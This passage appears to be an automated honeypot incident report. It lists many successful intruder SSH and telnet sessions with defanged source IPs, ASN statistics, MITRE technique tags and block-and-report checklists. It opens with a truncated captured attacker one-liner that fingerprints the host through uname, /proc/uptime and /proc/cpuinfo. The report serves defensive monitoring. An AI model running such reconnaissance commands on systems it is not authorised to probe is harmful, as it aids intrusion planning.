export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
Source IPs: `91.92.40.13`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **24** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS215925` | VPSVAULT.HOST LTD | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS52307` | CORPICO LTDA | 1 | MEDIUM |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | MEDIUM |
| `AS6939` | Hurricane Electric LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (330)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-741e44059616

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 08:55 |
| **Last Seen** | 2026-06-27 08:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:55:36` | `cowrie.session.connect` |
| `2026-06-27 08:55:36` | `cowrie.client.version` |
| `2026-06-27 08:55:37` | `cowrie.client.kex` |
| `2026-06-27 08:55:37` | `cowrie.login.success` |
| `2026-06-27 08:55:38` | `cowrie.session.params` |
| `2026-06-27 08:55:38` | `cowrie.command.input` |
| `2026-06-27 08:55:38` | `cowrie.log.closed` |
| `2026-06-27 08:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef78c8b0058

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 08:56 |
| **Last Seen** | 2026-06-27 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:56:30` | `cowrie.session.connect` |
| `2026-06-27 08:56:30` | `cowrie.client.version` |
| `2026-06-27 08:56:30` | `cowrie.client.kex` |
| `2026-06-27 08:56:30` | `cowrie.login.success` |
| `2026-06-27 08:56:31` | `cowrie.session.params` |
| `2026-06-27 08:56:31` | `cowrie.command.input` |
| `2026-06-27 08:56:31` | `cowrie.log.closed` |
| `2026-06-27 08:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56178209c825

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 08:57 |
| **Last Seen** | 2026-06-27 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:57:26` | `cowrie.session.connect` |
| `2026-06-27 08:57:26` | `cowrie.client.version` |
| `2026-06-27 08:57:26` | `cowrie.client.kex` |
| `2026-06-27 08:57:26` | `cowrie.login.success` |
| `2026-06-27 08:57:27` | `cowrie.session.params` |
| `2026-06-27 08:57:27` | `cowrie.command.input` |
| `2026-06-27 08:57:27` | `cowrie.log.closed` |
| `2026-06-27 08:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9fb1448eedf

| Field | Detail |
|---|---|
| **Source IP** | `223.85.102[.]135` |
| **First Seen** | 2026-06-27 08:57 |
| **Last Seen** | 2026-06-27 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:57:53` | `cowrie.session.connect` |
| `2026-06-27 08:57:55` | `cowrie.telnet.option` |
| `2026-06-27 08:59:53` | `cowrie.login.success` |
| `2026-06-27 08:59:54` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `223.85.102[.]135` to AbuseIPDB if not already reported
- [ ] Block `223.85.102[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf94be5d829a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 08:58 |
| **Last Seen** | 2026-06-27 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:58:23` | `cowrie.session.connect` |
| `2026-06-27 08:58:23` | `cowrie.client.version` |
| `2026-06-27 08:58:23` | `cowrie.client.kex` |
| `2026-06-27 08:58:23` | `cowrie.login.success` |
| `2026-06-27 08:58:24` | `cowrie.session.params` |
| `2026-06-27 08:58:24` | `cowrie.command.input` |
| `2026-06-27 08:58:24` | `cowrie.log.closed` |
| `2026-06-27 08:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933d5c0212ed

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 08:59 |
| **Last Seen** | 2026-06-27 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:59:21` | `cowrie.session.connect` |
| `2026-06-27 08:59:21` | `cowrie.client.version` |
| `2026-06-27 08:59:21` | `cowrie.client.kex` |
| `2026-06-27 08:59:21` | `cowrie.login.success` |
| `2026-06-27 08:59:22` | `cowrie.session.params` |
| `2026-06-27 08:59:22` | `cowrie.command.input` |
| `2026-06-27 08:59:22` | `cowrie.log.closed` |
| `2026-06-27 08:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a448d0d8cd0f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 08:59 |
| **Last Seen** | 2026-06-27 08:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 08:59:40` | `cowrie.session.connect` |
| `2026-06-27 08:59:42` | `cowrie.client.version` |
| `2026-06-27 08:59:42` | `cowrie.client.kex` |
| `2026-06-27 08:59:48` | `cowrie.login.success` |
| `2026-06-27 08:59:52` | `cowrie.session.params` |
| `2026-06-27 08:59:52` | `cowrie.command.input` |
| `2026-06-27 08:59:54` | `cowrie.log.closed` |
| `2026-06-27 08:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb95bfb9e15f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:00 |
| **Last Seen** | 2026-06-27 09:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:00:16` | `cowrie.session.connect` |
| `2026-06-27 09:00:16` | `cowrie.client.version` |
| `2026-06-27 09:00:16` | `cowrie.client.kex` |
| `2026-06-27 09:00:17` | `cowrie.login.success` |
| `2026-06-27 09:00:17` | `cowrie.session.params` |
| `2026-06-27 09:00:17` | `cowrie.command.input` |
| `2026-06-27 09:00:17` | `cowrie.log.closed` |
| `2026-06-27 09:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e51427766a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:01 |
| **Last Seen** | 2026-06-27 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:01:11` | `cowrie.session.connect` |
| `2026-06-27 09:01:11` | `cowrie.client.version` |
| `2026-06-27 09:01:11` | `cowrie.client.kex` |
| `2026-06-27 09:01:11` | `cowrie.login.success` |
| `2026-06-27 09:01:12` | `cowrie.session.params` |
| `2026-06-27 09:01:12` | `cowrie.command.input` |
| `2026-06-27 09:01:12` | `cowrie.log.closed` |
| `2026-06-27 09:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0f506ba801

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:02 |
| **Last Seen** | 2026-06-27 09:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:02:04` | `cowrie.session.connect` |
| `2026-06-27 09:02:04` | `cowrie.client.version` |
| `2026-06-27 09:02:04` | `cowrie.client.kex` |
| `2026-06-27 09:02:05` | `cowrie.login.success` |
| `2026-06-27 09:02:06` | `cowrie.session.params` |
| `2026-06-27 09:02:06` | `cowrie.command.input` |
| `2026-06-27 09:02:06` | `cowrie.log.closed` |
| `2026-06-27 09:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b125b70f04e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:02 |
| **Last Seen** | 2026-06-27 09:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:02:58` | `cowrie.session.connect` |
| `2026-06-27 09:02:58` | `cowrie.client.version` |
| `2026-06-27 09:02:59` | `cowrie.client.kex` |
| `2026-06-27 09:02:59` | `cowrie.login.success` |
| `2026-06-27 09:03:00` | `cowrie.session.params` |
| `2026-06-27 09:03:00` | `cowrie.command.input` |
| `2026-06-27 09:03:00` | `cowrie.log.closed` |
| `2026-06-27 09:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9d98e5d221

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:03 |
| **Last Seen** | 2026-06-27 09:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:03:54` | `cowrie.session.connect` |
| `2026-06-27 09:03:54` | `cowrie.client.version` |
| `2026-06-27 09:03:54` | `cowrie.client.kex` |
| `2026-06-27 09:03:55` | `cowrie.login.success` |
| `2026-06-27 09:03:56` | `cowrie.session.params` |
| `2026-06-27 09:03:56` | `cowrie.command.input` |
| `2026-06-27 09:03:56` | `cowrie.log.closed` |
| `2026-06-27 09:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e453fab3ccef

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:04 |
| **Last Seen** | 2026-06-27 09:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:04:52` | `cowrie.session.connect` |
| `2026-06-27 09:04:52` | `cowrie.client.version` |
| `2026-06-27 09:04:52` | `cowrie.client.kex` |
| `2026-06-27 09:04:53` | `cowrie.login.success` |
| `2026-06-27 09:04:53` | `cowrie.session.params` |
| `2026-06-27 09:04:53` | `cowrie.command.input` |
| `2026-06-27 09:04:54` | `cowrie.log.closed` |
| `2026-06-27 09:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9fbf838982

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:05 |
| **Last Seen** | 2026-06-27 09:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:05:49` | `cowrie.session.connect` |
| `2026-06-27 09:05:49` | `cowrie.client.version` |
| `2026-06-27 09:05:49` | `cowrie.client.kex` |
| `2026-06-27 09:05:49` | `cowrie.login.success` |
| `2026-06-27 09:05:50` | `cowrie.session.params` |
| `2026-06-27 09:05:50` | `cowrie.command.input` |
| `2026-06-27 09:05:50` | `cowrie.log.closed` |
| `2026-06-27 09:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fd8ecd7dac

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 09:05 |
| **Last Seen** | 2026-06-27 09:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:05:51` | `cowrie.session.connect` |
| `2026-06-27 09:05:51` | `cowrie.client.version` |
| `2026-06-27 09:05:51` | `cowrie.client.kex` |
| `2026-06-27 09:05:52` | `cowrie.login.success` |
| `2026-06-27 09:05:54` | `cowrie.session.params` |
| `2026-06-27 09:05:54` | `cowrie.command.input` |
| `2026-06-27 09:05:55` | `cowrie.log.closed` |
| `2026-06-27 09:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c401efeab64

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:06 |
| **Last Seen** | 2026-06-27 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:06:46` | `cowrie.session.connect` |
| `2026-06-27 09:06:46` | `cowrie.client.version` |
| `2026-06-27 09:06:46` | `cowrie.client.kex` |
| `2026-06-27 09:06:46` | `cowrie.login.success` |
| `2026-06-27 09:06:47` | `cowrie.session.params` |
| `2026-06-27 09:06:47` | `cowrie.command.input` |
| `2026-06-27 09:06:47` | `cowrie.log.closed` |
| `2026-06-27 09:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae3221db723

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:07 |
| **Last Seen** | 2026-06-27 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:07:44` | `cowrie.session.connect` |
| `2026-06-27 09:07:44` | `cowrie.client.version` |
| `2026-06-27 09:07:44` | `cowrie.client.kex` |
| `2026-06-27 09:07:45` | `cowrie.login.success` |
| `2026-06-27 09:07:45` | `cowrie.session.params` |
| `2026-06-27 09:07:45` | `cowrie.command.input` |
| `2026-06-27 09:07:45` | `cowrie.log.closed` |
| `2026-06-27 09:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c6bf72e71e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-06-27 09:08 |
| **Last Seen** | 2026-06-27 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:08:28` | `cowrie.session.connect` |
| `2026-06-27 09:08:28` | `cowrie.client.version` |
| `2026-06-27 09:08:28` | `cowrie.client.kex` |
| `2026-06-27 09:08:28` | `cowrie.login.success` |
| `2026-06-27 09:08:29` | `cowrie.session.params` |
| `2026-06-27 09:08:29` | `cowrie.command.input` |
| `2026-06-27 09:08:29` | `cowrie.log.closed` |
| `2026-06-27 09:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7984d43b46d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:08 |
| **Last Seen** | 2026-06-27 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:08:39` | `cowrie.session.connect` |
| `2026-06-27 09:08:39` | `cowrie.client.version` |
| `2026-06-27 09:08:39` | `cowrie.client.kex` |
| `2026-06-27 09:08:39` | `cowrie.login.success` |
| `2026-06-27 09:08:40` | `cowrie.session.params` |
| `2026-06-27 09:08:40` | `cowrie.command.input` |
| `2026-06-27 09:08:40` | `cowrie.log.closed` |
| `2026-06-27 09:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd004f9708c0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:09 |
| **Last Seen** | 2026-06-27 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:09:33` | `cowrie.session.connect` |
| `2026-06-27 09:09:33` | `cowrie.client.version` |
| `2026-06-27 09:09:33` | `cowrie.client.kex` |
| `2026-06-27 09:09:34` | `cowrie.login.success` |
| `2026-06-27 09:09:35` | `cowrie.session.params` |
| `2026-06-27 09:09:35` | `cowrie.command.input` |
| `2026-06-27 09:09:35` | `cowrie.log.closed` |
| `2026-06-27 09:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c100d3cda78e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:10 |
| **Last Seen** | 2026-06-27 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:10:30` | `cowrie.session.connect` |
| `2026-06-27 09:10:30` | `cowrie.client.version` |
| `2026-06-27 09:10:30` | `cowrie.client.kex` |
| `2026-06-27 09:10:30` | `cowrie.login.success` |
| `2026-06-27 09:10:31` | `cowrie.session.params` |
| `2026-06-27 09:10:31` | `cowrie.command.input` |
| `2026-06-27 09:10:31` | `cowrie.log.closed` |
| `2026-06-27 09:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c0b357e1ee

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 09:11 |
| **Last Seen** | 2026-06-27 09:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:11:00` | `cowrie.session.connect` |
| `2026-06-27 09:11:02` | `cowrie.client.version` |
| `2026-06-27 09:11:02` | `cowrie.client.kex` |
| `2026-06-27 09:11:08` | `cowrie.login.success` |
| `2026-06-27 09:11:12` | `cowrie.session.params` |
| `2026-06-27 09:11:12` | `cowrie.command.input` |
| `2026-06-27 09:11:13` | `cowrie.log.closed` |
| `2026-06-27 09:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80cb5d12b0d6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:11 |
| **Last Seen** | 2026-06-27 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:11:27` | `cowrie.session.connect` |
| `2026-06-27 09:11:27` | `cowrie.client.version` |
| `2026-06-27 09:11:27` | `cowrie.client.kex` |
| `2026-06-27 09:11:27` | `cowrie.login.success` |
| `2026-06-27 09:11:28` | `cowrie.session.params` |
| `2026-06-27 09:11:28` | `cowrie.command.input` |
| `2026-06-27 09:11:28` | `cowrie.log.closed` |
| `2026-06-27 09:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1287f37500d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:12 |
| **Last Seen** | 2026-06-27 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:12:23` | `cowrie.session.connect` |
| `2026-06-27 09:12:23` | `cowrie.client.version` |
| `2026-06-27 09:12:23` | `cowrie.client.kex` |
| `2026-06-27 09:12:23` | `cowrie.login.success` |
| `2026-06-27 09:12:24` | `cowrie.session.params` |
| `2026-06-27 09:12:24` | `cowrie.command.input` |
| `2026-06-27 09:12:24` | `cowrie.log.closed` |
| `2026-06-27 09:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1b9ebe201f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:13 |
| **Last Seen** | 2026-06-27 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:13:18` | `cowrie.session.connect` |
| `2026-06-27 09:13:18` | `cowrie.client.version` |
